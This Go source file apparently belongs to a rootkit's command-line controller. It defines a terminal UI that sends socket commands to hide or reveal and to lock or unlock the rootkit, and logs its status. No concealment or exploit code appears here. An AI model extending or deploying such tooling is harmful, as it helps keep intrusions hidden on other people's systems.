package model

import (
	"fmt"
	"strings"
	"time"

	"cli/server"

	tea "github.com/charmbracelet/bubbletea"
)

type HideModel struct {
	srv       *server.Server
	locked    *bool
	isLoading *bool
	logs      *LogsModel
	isHidden  *bool
	isDoing   *bool
}

type (
	HideStartCmd int
	HideDoneCmd  int
	LockStartCmd int
	LockDoneCmd  int
)

func NewHideModel(cfg TabCfg, isHidden *bool) *HideModel {
	b := false
	h := HideModel{
		srv:       cfg.srv,
		locked:    cfg.locked,
		isLoading: cfg.isLoading,
		isDoing:   &b,
		logs:      cfg.logs,
		isHidden:  isHidden,
	}

	return &h
}

func (h HideModel) Init() tea.Cmd {
	return nil
}

func (h HideModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	var cmds []tea.Cmd
	switch msg := msg.(type) {
	case tea.KeyMsg:
		switch msg.String() {
		case "h":
			if !*h.isLoading && !*h.isDoing {
				cmds = append(cmds, tea.Sequence(h.startHideCmd, h.waitForHideResultCmd))
			} else {
				h.logs.Append("hide: another command is already running\n")
			}
		case "l":
			if !*h.isLoading && !*h.isDoing {
				cmds = append(cmds, tea.Sequence(h.startLockCmd, h.waitForLockResultCmd))
			} else {
				h.logs.Append("lock: another command is already running\n")
			}

		}
	}
	return h, tea.Batch(cmds...)
}

func (h HideModel) View() string {
	if h.srv.ConnState != server.Connected {
		return "Status: Unknown\n"
	}
	s := strings.Builder{}

	hideStatus := "Not Hidden"
	hideToggle := "hide"
	if *h.isHidden {
		hideStatus = "Hidden"
		hideToggle = "reveal"
	}

	lockStatus := "Unlocked"
	lockToggle := "Lock"
	if *h.locked {
		lockStatus = "Locked"
		lockToggle = "Unlock"
	}

	s.WriteString(fmt.Sprintf("Status: %s | %s\n", hideStatus, lockStatus))
	s.WriteString(fmt.Sprintf("Press 'h' to %s.\n", hideToggle))
	s.WriteString(fmt.Sprintf("Press 'l' to %s.\n", lockToggle))

	return s.String()
}

func (h HideModel) startHideCmd() tea.Msg {
	if *h.isLoading || h.srv.ConnState != server.Connected {
		h.logs.Append("Hide: not connected\n")
		return nil
	}

	conn := *h.srv.Sock
	_, err := fmt.Fprintf(conn, "2\n")
	if err != nil {
		return ConnectionUpdateMsg(server.Disconnected)
	}

	*h.isDoing = true
	*h.isLoading = true
	return HideStartCmd(1)
}

func (h *HideModel) waitForHideResultCmd() tea.Msg {
	if !*h.isDoing {
		return nil
	}
	ch := h.srv.Channel
	timer := time.NewTimer(10 * time.Second)
loop:
	for {
		select {
		case msg, ok := <-ch:
			if ok {
				h.logs.Append(msg)
				l := msg[0]
				switch l {
				case '0':
					*h.isHidden = false
				case '1':
					*h.isHidden = true
				default:
					h.logs.Append("hide: couldn't determine lock status\n")
				}
			} else {
				h.logs.Append("hide not ok\n")
			}
			break loop
		case <-timer.C:
			h.logs.Append("hide timed out\n")
			break loop
		}
	}
	*h.isLoading = false
	*h.isDoing = false
	return HideDoneCmd(1)
}

func (h HideModel) startLockCmd() tea.Msg {
	if *h.isLoading || h.srv.ConnState != server.Connected {
		h.logs.Append("Lock: not connected\n")
		return nil
	}

	conn := *h.srv.Sock
	_, err := fmt.Fprintf(conn, "6\n")
	if err != nil {
		return ConnectionUpdateMsg(server.Disconnected)
	}

	*h.isDoing = true
	*h.isLoading = true
	return LockStartCmd(1)
}

func (h *HideModel) waitForLockResultCmd() tea.Msg {
	if !*h.isDoing {
		return nil
	}
	ch := h.srv.Channel
	timer := time.NewTimer(10 * time.Second)
loop:
	for {
		select {
		case msg, ok := <-ch:
			if ok {
				h.logs.Append(msg)
				l := msg[0]
				switch l {
				case '0':
					*h.locked = false
					h.logs.Append("lock: rootkit is unlocked! 🔓\n")
				case '1':
					*h.locked = true
					h.logs.Append("lock: rootkit is locked 🔒\n")
				default:
					h.logs.Append("lock: couldn't determine lock status. locking..\n")
				}
			} else {
				h.logs.Append("lock not ok\n")
			}
			break loop
		case <-timer.C:
			h.logs.Append("lock timed out\n")
			break loop
		}
	}
	*h.isLoading = false
	*h.isDoing = false
	return LockDoneCmd(1)
}
